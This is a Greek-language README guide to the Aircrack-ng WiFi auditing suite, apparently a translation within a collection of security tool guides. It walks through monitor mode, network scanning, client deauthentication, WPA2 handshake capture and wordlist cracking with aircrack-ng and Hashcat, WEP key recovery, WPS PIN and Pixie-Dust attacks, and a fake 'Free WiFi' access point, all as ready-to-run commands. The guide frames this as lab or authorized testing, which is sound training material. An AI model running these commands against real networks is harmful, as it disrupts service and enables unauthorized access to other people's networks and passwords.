# 📶 Aircrack-ng — Οδηγός εργαλείων ελέγχου WiFi

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    Εργαλεία ελέγχων ασφάλειας WiFi
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

---

## Πριν ξεκινήσετε

Το **Aircrack-ng** είναι οικογένεια εργαλείων για παρατήρηση και ελεγχόμενη αξιολόγηση ασύρματων δικτύων. Η συνηθισμένη **managed mode** συνδέει την κάρτα ως πελάτη σε δίκτυο. Η **monitor mode** επιτρέπει παρατήρηση πλαισίων 802.11 που λαμβάνει ο προσαρμογέας στο επιλεγμένο κανάλι. Η δυνατότητα **packet injection** αφορά αποστολή κατασκευασμένων πλαισίων και είναι χωριστή απαίτηση.

**Βασικοί όροι:** AP = σημείο πρόσβασης, BSSID = συνήθως MAC του ασύρματου σημείου πρόσβασης, SSID/ESSID = όνομα δικτύου, station/client = ασύρματος πελάτης, channel = κανάλι, handshake = ανταλλαγή μηνυμάτων δημιουργίας σύνδεσης, PSK = κοινό μυστικό σύνδεσης, IV = διάνυσμα αρχικοποίησης κρυπτογράφησης. Τα CCMP/TKIP είναι διαφορετικοί μηχανισμοί προστασίας, ενώ OPN σημαίνει ανοικτό δίκτυο.

Η υποστήριξη εξαρτάται από chipset, έκδοση συσκευής, driver, ζώνη συχνοτήτων και λειτουργικό. Οι εντολές αφορούν εργαστήρια ή ρητά εγκεκριμένα δίκτυα. Περιλαμβάνουν διακοπή σύνδεσης, ενεργές δοκιμές και αλλαγές ρυθμίσεων· διατηρούνται αυτούσιες από το πρωτότυπο και δεν εκτελούνται κατά τη μετάφραση.

## 📋 Περιεχόμενα

- [Τι είναι το Aircrack-ng](#section-01)
- [Εγκατάσταση](#section-02)
- [Λειτουργία παρακολούθησης (monitor mode)](#section-03)
- [Συλλογή πληροφοριών μέσω airodump-ng](#section-04)
- [Πλαίσια αποσύνδεσης μέσω aireplay-ng](#section-05)
- [Έλεγχος υποψήφιων κωδικών WPA/WPA2](#section-06)
- [Ανάκτηση κλειδιού WEP](#section-07)
- [Έλεγχοι WPS](#section-08)
- [Πρόσθετα εργαλεία](#section-09)
- [Συνολική ροή εργαστηριακού ελέγχου](#section-10)
- [Γρήγορη αναφορά](#section-11)
- [Πλαίσιο εξουσιοδοτημένης χρήσης](#section-12)
- [Πηγές](#section-13)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Aircrack-ng

**Aircrack-ng** είναι οικογένεια εργαλείων αξιολόγησης ασφάλειας WiFi. Περιλαμβάνει:

- 📡 **airodump-ng** — καταγραφή πακέτων και αναγνώριση δικτύων
- 💥 **aireplay-ng** — εισαγωγή πλαισίων και δοκιμές αποσύνδεσης
- 🔓 **aircrack-ng** — ανάκτηση WEP και έλεγχος υποψήφιων κωδικών WPA/WPA2-PSK
- 🔧 **airmon-ng** — ενεργοποίηση και απενεργοποίηση monitor mode
- 📝 **airodecap-ng** — όνομα του πρωτοτύπου· το σχετικό εκτελέσιμο παρακάτω είναι airdecap-ng

### Προϋποθέσεις

> **Chipset και έκδοση συσκευής:** Τα μοντέλα του πίνακα είναι ενδεικτικά στοιχεία του πρωτοτύπου, όχι εγγύηση αγοράς ή συμβατότητας. Διαφορετικό hardware revision του ίδιου εμπορικού ονόματος μπορεί να χρησιμοποιεί άλλο chipset. Ελέγξτε driver, monitor/injection και τις ζώνες που υποστηρίζει η συγκεκριμένη συσκευή.


| Προϋπόθεση | Περιγραφή |
| ------------- | ------------- |
| **Ασύρματος προσαρμογέας** | Χρειάζεται υποστήριξη monitor mode και, για ενεργές δοκιμές, packet injection |
| **Ενδεικτικά υποστηριζόμενα chipsets** | Ορισμένα chipsets Atheros, Ralink και Realtek |
| **Λειτουργικό σύστημα** | Προτείνεται Linux στο πρωτότυπο, π.χ. Kali |

### Ενδεικτικοί προσαρμογείς του πρωτοτύπου

| Προσαρμογέας | Chipset — ολοκληρωμένο ασύρματης συσκευής | Σημειώσεις |
| --------- | --------- | ------- |
| Alfa AWUS036ACH | RTL8812AU | Υποστήριξη δύο ζωνών κατά το πρωτότυπο |
| Alfa AWUS036NHA | Atheros AR9271 | Κλασική επιλογή κατά το πρωτότυπο |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Οικονομική επιλογή κατά το πρωτότυπο |

---

<a id="section-02"></a>

## 🚀 Εγκατάσταση

### Kali Linux (συνήθως προεγκατεστημένο)

```bash
# Επιβεβαίωση εγκατάστασης και έκδοσης
aircrack-ng --version

# Ενημέρωση
sudo apt update && sudo apt install aircrack-ng
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

### Εγκατάσταση από πηγαίο κώδικα

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

<a id="section-03"></a>

## 📡 Λειτουργία παρακολούθησης (monitor mode)

> **Όνομα διεπαφής και σύνδεση:** Το wlan0mon είναι παράδειγμα, όχι σταθερό αποτέλεσμα. Η monitor mode μπορεί να επηρεάσει την κανονική σύνδεση της κάρτας. Το check kill και η διακοπή NetworkManager/wpa_supplicant μπορούν να κόψουν και την πρόσβαση του ίδιου του συστήματος· απαιτείται επαναφορά όταν ολοκληρωθεί η εργαστηριακή δοκιμή.


### Έλεγχος ασύρματης διεπαφής

```bash
# Καταγραφή ασύρματων διεπαφών
iwconfig

# Εναλλακτικά
iw dev

# Εναλλακτικά
airmon-ng
```

### Ενεργοποίηση monitor mode

```bash
# Μέθοδος 1: μέσω airmon-ng
sudo airmon-ng start wlan0

# Ενδεικτική έξοδος: ενεργοποίηση monitor mode στο wlan0mon

# Μέθοδος 2: χειροκίνητη ρύθμιση
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Διακοπή διεργασιών που παρεμβαίνουν

```bash
# Διακοπή διεργασιών που μπορεί να παρεμβαίνουν
sudo airmon-ng check kill

# Εναλλακτική χειροκίνητη ρύθμιση
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

### Απενεργοποίηση monitor mode

```bash
# Απενεργοποίηση monitor mode
sudo airmon-ng stop wlan0mon

# Επανεκκίνηση NetworkManager
sudo systemctl start NetworkManager
```

### Αλλαγή καναλιού

```bash
# Ορισμός συγκεκριμένου καναλιού
sudo iwconfig wlan0mon channel 6

# Εναλλακτικά, μέσω airmon-ng
sudo airmon-ng start wlan0 6
```

---

<a id="section-04"></a>

## 🔍 Συλλογή πληροφοριών μέσω airodump-ng

> **Περιορισμένη ορατότητα:** Η καταγραφή εξαρτάται από κανάλι, ζώνη, driver, απόσταση και χρονικό διάστημα παρατήρησης. Το abg του παραδείγματος δεν σημαίνει κάλυψη κάθε σύγχρονης ζώνης, όπως 6GHz. Ένα SSID δεν αποδεικνύει ιδιοκτησία δικτύου και μια απουσία καταγραφής δεν αποδεικνύει απουσία συσκευής.


### Βασική αναζήτηση δικτύων

```bash
# Αναζήτηση ορατών δικτύων στην υποστηριζόμενη ζώνη και στα διαθέσιμα κανάλια
sudo airodump-ng wlan0mon

# Έξοδος:
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

### Αναζήτηση σε συγκεκριμένη ζώνη συχνοτήτων

```bash
# Μόνο ζώνη 2.4GHz
sudo airodump-ng --band g wlan0mon

# Μόνο ζώνη 5GHz
sudo airodump-ng --band a wlan0mon

# Και οι δύο ζώνες του παραδείγματος
sudo airodump-ng --band abg wlan0mon
```

### Επιλογή συγκεκριμένου δικτύου

```bash
# Επιλογή βάσει καναλιού και BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Αποθήκευση καταγραφής σε αρχείο
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Δημιουργεί αρχεία όπως capture-01.cap, capture-01.csv κ.λπ.
```

### Κατανόηση εξόδου

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| Πεδίο | Περιγραφή |
| ------- | ------------- |
| BSSID | Διεύθυνση MAC σημείου πρόσβασης |
| PWR | Ένταση σήματος· στις συνήθεις αρνητικές τιμές dBm, πιο κοντά στο 0 σημαίνει ισχυρότερο σήμα |
| Πλαίσια αναγγελίας (beacons) | Πλήθος πλαισίων αναγγελίας |
| #Δεδομένα | Πλήθος πακέτων δεδομένων |
| CH | Κανάλι |
| ENC | Ένδειξη ασφάλειας WPA2/WPA/WEP ή ανοικτού δικτύου OPN |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | Όνομα δικτύου |
| STATION | Διεύθυνση MAC πελάτη που παρατηρείται |

### Επιλογές εξαίρεσης αποτελεσμάτων

```bash
# Φίλτρο εμφάνισης κρυπτογραφημένων δικτύων
sudo airodump-ng --encrypt wpa2 wlan0mon

# Εμφάνιση μόνο WEP
sudo airodump-ng --encrypt wep wlan0mon

# Συγκεκριμένο ESSID
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

<a id="section-05"></a>

## 💥 Πλαίσια αποσύνδεσης μέσω aireplay-ng

> **Δεν εγγυάται επανασύνδεση ή handshake:** Η προστασία management frames (PMF), η συμπεριφορά του πελάτη και η ποιότητα καταγραφής επηρεάζουν το αποτέλεσμα. Η αποσύνδεση διαταράσσει την υπηρεσία. Μια ένδειξη handshake δεν αποκαλύπτει τον κωδικό και χρειάζεται έλεγχος ότι η καταγραφή είναι κατάλληλη.


### Γιατί χρησιμοποιείται το deauthentication;

Τα πλαίσια deauthentication μπορεί να προκαλέσουν επανασύνδεση πελάτη, ώστε να καταγραφεί το 4-way handshake για έλεγχο WPA/WPA2-PSK. Η αποσύνδεση και η επανασύνδεση δεν είναι εγγυημένες.

### Παράδειγμα deauthentication προς έναν πελάτη

```bash
# Δοκιμή αποσύνδεσης συγκεκριμένου πελάτη
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Δοκιμή πλαισίων deauthentication
# 5  : Πλήθος κατά το παράδειγμα, 0 = αδιάκοπη επανάληψη
# -a : BSSID σημείου πρόσβασης
# -c : MAC πελάτη
```

### Παράδειγμα deauthentication προς όλους τους πελάτες

```bash
# Πλαίσια αποσύνδεσης προς όλους τους πελάτες
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Παράδειγμα μεγαλύτερης διατάραξης επικοινωνίας
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Έλεγχος παρουσίας handshake

```
# Στο airodump-ng αναζητήστε την ένδειξη:
WPA handshake: AA:BB:CC:DD:EE:FF

# Η ένδειξη εμφανίζεται επάνω δεξιά
```

---

<a id="section-06"></a>

## 🔓 Έλεγχος υποψήφιων κωδικών WPA/WPA2

> **Ποιο σενάριο καλύπτεται:** Τα συγκεκριμένα παραδείγματα αφορούν WPA/WPA2-PSK και δοκιμή υποψήφιων κοινών κωδικών. Δεν αποτελούν γενική μέθοδο για Enterprise/802.1X ή WPA3-SAE. Η λέξη πρέπει να περιλαμβάνεται στις δοκιμαζόμενες υποψήφιες τιμές και η καταγραφή να είναι κατάλληλη. Δείτε το [επίσημο εγχειρίδιο aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng).


### Ροή καταγραφής και ελέγχου WPA2

```bash
# Βήμα 1: Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Βήμα 2: Scan for networks
sudo airodump-ng wlan0mon

# Βήμα 3: Target specific network (capture)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Βήμα 4: Deauth client (new terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Βήμα 5: Wait for handshake (shows in airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Βήμα 6: Crack with wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Έλεγχος υποψηφίων από λίστα λέξεων

```bash
# Βασικός έλεγχος κωδικών από λίστα
aircrack-ng -w wordlist.txt capture-01.cap

# Χρήση λίστας rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Πολλαπλές λίστες υποψήφιων κωδικών
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

### Επιλογή συγκεκριμένου ESSID

```bash
# Αν η καταγραφή περιέχει πολλά δίκτυα
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# Εναλλακτικά, βάσει BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Χρήση Hashcat με κατάλληλη μορφή εισόδου

> **Ασυμβατότητα μορφών στο πρωτότυπο:** HCCAP, HCCAPX και η μορφή κειμένου 22000 είναι διαφορετικές μορφές. Το -j του aircrack-ng αφορά εξαγωγή hccap, ενώ τα αρχικά -J/ονόματα .hccapx χρειάζονται έλεγχο. Η αλλαγή κατάληξης δεν μετατρέπει το περιεχόμενο. Η εντολή mode 22000 με αρχείο hccapx δεν είναι σωστό ολοκληρωμένο παράδειγμα. Δείτε την [επίσημη μορφή WPA/PMKID του Hashcat](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2).


```bash
# Παράδειγμα μετατροπής καταγραφής για Hashcat
aircrack-ng capture-01.cap -J hashcat_file
# Το πρωτότυπο αναφέρει hashcat_file.hccapx· η πραγματική μορφή χρειάζεται έλεγχο

# Εναλλακτικά, χρήση του παλιού cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# Έλεγχος υποψήφιων κωδικών με Hashcat
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# Το hashcat -m 2500 αφορά παλιότερη μορφή hccap και μπορεί να μην υποστηρίζεται πλέον
```

### Μετατροπή μορφών αρχείων

```bash
# Το πρωτότυπο αναφέρει HCCAPX· ελέγξτε τη μορφή που παράγει η συγκεκριμένη επιλογή
aircrack-ng capture-01.cap -j hashcat_output

# Μετατροπή μορφής αρχείου καταγραφής· η κατάληξη δεν αρκεί για τον καθορισμό της
editcap capture-01.cap output.pcap

# Συνένωση πολλών καταγραφών
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

<a id="section-07"></a>

## 🔐 Ανάκτηση κλειδιού WEP

> **Ιστορικά εργαστηριακά σενάρια:** Το WEP είναι διαφορετικό από WPA/WPA2 και οι τεχνικές του δεν μεταφέρονται αυτόματα σε αυτά. Ο αριθμός IVs είναι ενδεικτικός, όχι καθολικό όριο επιτυχίας. Η επιτυχία εξαρτάται και από τον τύπο και την ποιότητα των καταγεγραμμένων πακέτων.


> ⚠️ Το WEP είναι παρωχημένο και μη ασφαλές. Για σύγχρονη προστασία χρησιμοποιούνται WPA2/WPA3 με κατάλληλη ρύθμιση.

### Κατηγορίες ελέγχων WEP

| Τρόπος ελέγχου | Περιγραφή |
| -------- | ------------- |
| Επανάληψη πακέτων ARP | Καταγραφή και επανάληψη πακέτων ARP |
| Δοκιμαστική ταυτοποίηση WEP | Συσχέτιση με σημείο πρόσβασης στις προϋποθέσεις της τεχνικής |
| Κατακερματισμός | Ανάκτηση τμήματος ροής κλειδιού υπό προϋποθέσεις |
| ChopChop | Ανάκτηση δεδομένων πακέτων υπό συγκεκριμένες προϋποθέσεις WEP |

### Βασικό παράδειγμα ελέγχου WEP

```bash
# Βήμα 1: Καταγραφή κίνησης δικτύου
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Βήμα 2: Fake authentication
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Βήμα 3: ARP replay attack
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Βήμα 4: Crack when enough IVs (>50,000)
sudo aircrack-ng wep_capture-01.cap
```

### Λειτουργίες aireplay-ng

| Λειτουργία | Περιγραφή |
| ------ | ------------- |
| `-0` | Αποσύνδεση (deauthentication) |
| `-1` | Δοκιμαστική ταυτοποίηση WEP |
| `-2` | Διαδραστική επανάληψη πακέτων |
| `-3` | Επανάληψη αιτήματος ARP |
| `-4` | Δοκιμή KoreK chopchop για WEP |
| `-5` | Δοκιμή κατακερματισμού WEP |
| `-9` | Έλεγχος δυνατότητας εισαγωγής πλαισίων |

---

<a id="section-08"></a>

## 🔓 Έλεγχοι WPS

> **Ενεργοποιημένο WPS δεν αρκεί:** Δοκιμή PIN και Pixie-Dust έχουν διαφορετικές προϋποθέσεις. Το Pixie-Dust αφορά ευάλωτη παραγωγή τυχαίων τιμών στη συγκεκριμένη υλοποίηση· δεν είναι γενική ταχύτερη μέθοδος για κάθε AP. Ενδέχεται να ισχύουν όρια ή κλείδωμα WPS.


### Χρήση Reaver

```bash
# Εγκατάσταση Reaver
sudo apt install reaver

# Βασικό παράδειγμα ελέγχου WPS
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Με επιλογή καναλιού
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Έλεγχος Pixie-Dust όπου η υλοποίηση WPS είναι ευάλωτη
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

### Χρήση Bully

```bash
# Εγκατάσταση Bully
sudo apt install bully

# Βασικό παράδειγμα δοκιμής
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### Wash — αναζήτηση σημείων πρόσβασης με WPS

```bash
# Αναζήτηση δικτύων με WPS
sudo wash -i wlan0mon

# Η έξοδος εμφανίζει:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

<a id="section-09"></a>

## 🔧 Πρόσθετα εργαλεία

### airbase-ng — δοκιμαστικό μη γνήσιο σημείο πρόσβασης

```bash
# Δημιουργία δοκιμαστικού μη γνήσιου σημείου πρόσβασης
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# Με συγκεκριμένο BSSID
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### airdecap-ng — αποκρυπτογράφηση κατάλληλων καταγραφών

> **Γνωστό μυστικό και σωστή καταγραφή:** Η χρήση airdecap-ng δεν παρακάμπτει μόνη της κρυπτογράφηση. Χρειάζονται τα κατάλληλα στοιχεία του συγκεκριμένου δικτύου και της σύνδεσης. Το airodecap-ng της εισαγωγής είναι τυπογραφική αναφορά του πρωτοτύπου.


```bash
# Αποκρυπτογράφηση κατάλληλης καταγραφής WPA με γνωστό κλειδί
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Αποκρυπτογράφηση κατάλληλης καταγραφής WEP
airdecap-ng -w <wep_key> capture-01.cap
```

### Επιλογές aircrack-ng

```bash
# Εμφάνιση διαθέσιμων επιλογών
aircrack-ng --help

# Χρήση πολλών πυρήνων CPU
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Περιορισμένη έξοδος
aircrack-ng -q -w wordlist.txt capture-01.cap

# Ορισμός ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

### packetforge-ng — δημιουργία πλαισίων

```bash
# Δημιουργία πλαισίου ARP
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

<a id="section-10"></a>

## 🎯 Συνολική ροή εργαστηριακού ελέγχου

### Έλεγχος WPA2 ανά βήμα

> **Η ίδια διευκρίνιση μορφής ισχύει και εδώ:** Η εξαγωγή με -j και η επόμενη εντολή Hashcat 22000 δεν αποτελούν συμβατή αλυσίδα ως έχουν. Διατηρούνται για αντιστοίχιση με το αγγλικό κείμενο· χρειάζονται σωστή μορφή δεδομένων και επιλογές της έκδοσής σας.


```bash
# Τερματικό 1: προετοιμασία
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Επιβεβαίωση monitor mode
iwconfig  # Ενδεικτικό όνομα monitor διεπαφής: wlan0mon

# Τερματικό 1: αναζήτηση δικτύων
sudo airodump-ng wlan0mon
# Σημειώστε BSSID, CH και ESSID του εγκεκριμένου στόχου

# Τερματικό 1: επιλογή στόχου και καταγραφή
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# Τερματικό 2: δοκιμή πλαισίων αποσύνδεσης
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# Αναμονή της ένδειξης "WPA handshake: XX:XX:XX:XX:XX:XX" στο Τερματικό 1
# Πατήστε Ctrl+C για τερματισμό καταγραφής

# Τερματικό 1: έλεγχος υποψήφιων κωδικών με βάση την καταγραφή
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Εναλλακτικά, Hashcat με κατάλληλη GPU και μορφή δεδομένων
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

### Επαναφορά κατάστασης μετά τη δοκιμή

```bash
# Απενεργοποίηση monitor mode
sudo airmon-ng stop wlan0mon

# Επανεκκίνηση NetworkManager
sudo systemctl start NetworkManager

# Προαιρετική διαγραφή αρχείων του παραδείγματος
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

<a id="section-11"></a>

## 📊 Γρήγορη αναφορά

### Βασικές εντολές

| Σκοπός | Εντολή |
| --------- | --------- |
| Ενεργοποίηση monitor mode | `airmon-ng start wlan0` |
| Απενεργοποίηση monitor mode | `airmon-ng stop wlan0mon` |
| Διακοπή διεργασιών που παρεμβαίνουν | `airmon-ng check kill` |
| Αναζήτηση δικτύων | `airodump-ng wlan0mon` |
| Επιλογή δικτύου | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Αποσύνδεση με πλαίσια deauthentication | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| Έλεγχος υποψήφιου κωδικού WPA | `aircrack-ng -w wordlist.txt capture.cap` |

### Σύνοψη μεθόδων

| Τρόπος ελέγχου | Κρυπτογράφηση | Μέθοδος |
| -------- | ------------ | -------- |
| Λίστα λέξεων (Dictionary) | WPA/WPA2 | Καταγραφή handshake και έλεγχος υποψήφιων κωδικών από λίστα |
| Reaver | WPS | Δοκιμή υποψήφιων PIN WPS |
| Pixie-Dust | WPS | Έλεγχος WPS εκτός σύνδεσης, όπου υπάρχουν οι προϋποθέσεις |
| Επανάληψη πακέτων ARP | WEP | Συλλογή διανυσμάτων αρχικοποίησης (IVs) και προσπάθεια ανάκτησης κλειδιού |

### Χρήσιμες λίστες υποψήφιων κωδικών

| Διαδρομή | Περιγραφή |
| ------ | ------------- |
| `/usr/share/wordlists/rockyou.txt` | Συνήθης λίστα στο Kali |
| `/usr/share/wordlists/fasttrack.txt` | Σύντομος έλεγχος |
| `/usr/share/seclists/Passwords/` | Συλλογή SecLists |

### Διερεύνηση προβλημάτων

```bash
# Η διεπαφή δεν μεταβαίνει σε monitor mode
sudo rfkill unblock wifi
sudo rfkill unblock all

# Ενεργή δοκιμή δυνατότητας εισαγωγής πλαισίων
sudo aireplay-ng -9 wlan0mon

# Δεν έχει καταγραφεί handshake
# - Μείωση απόστασης από τον εγκεκριμένο εργαστηριακό στόχο
# - Εξέταση διαφορετικών εργαστηριακών πελατών
# - Το πρωτότυπο προτείνει περισσότερα πλαίσια αποσύνδεσης· δεν εγγυάται καταγραφή και αυξάνει την επίδραση
# - Περισσότερος χρόνος παρατήρησης

# Μήνυμα Airmon: "Found X processes"
sudo airmon-ng check kill
```

---

<a id="section-12"></a>

## ⚠️ Πλαίσιο εξουσιοδοτημένης χρήσης

```
⚠️ Χρησιμοποιείτε τα εργαλεία σε δικά σας εργαστηριακά δίκτυα ή με
ρητή γραπτή άδεια ελέγχου. Η μη εξουσιοδοτημένη πρόσβαση
σε δίκτυα μπορεί να επιφέρει νομικές κυρώσεις.

Εγκεκριμένες χρήσεις:
✅ Έλεγχος ασφάλειας
✅ Δοκιμή διείσδυσης με άδεια
✅ Εκπαίδευση σε εργαστηριακό περιβάλλον

Μη επιτρεπόμενες χρήσεις:
❌ Πρόσβαση σε δίκτυα χωρίς εξουσιοδότηση
❌ Κλοπή στοιχείων πρόσβασης
❌ Κακόβουλες ενέργειες
```

---

<a id="section-13"></a>

## 📚 Πηγές

- [Επίσημος ιστότοπος Aircrack-ng](https://www.aircrack-ng.org/)
- [Τεκμηρίωση Aircrack-ng](https://www.aircrack-ng.org/doku.php)
- [Τεκμηρίωση Hashcat για WiFi](https://hashcat.net/wiki/)

### Σχετικοί οδηγοί
- [Hashcat](../../Hashcat/translations/README.el.md)
- [Wireshark](../../Wireshark/translations/README.el.md)
- [Εντολές Linux](../../Linux-Commands/translations/README.el.md)

---

<p align="center">
  <b>📶 Κατανοήστε την ασφάλεια WiFi!</b><br>
  <i>Aircrack-ng — εργαλεία εργαστηριακού ελέγχου WiFi</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
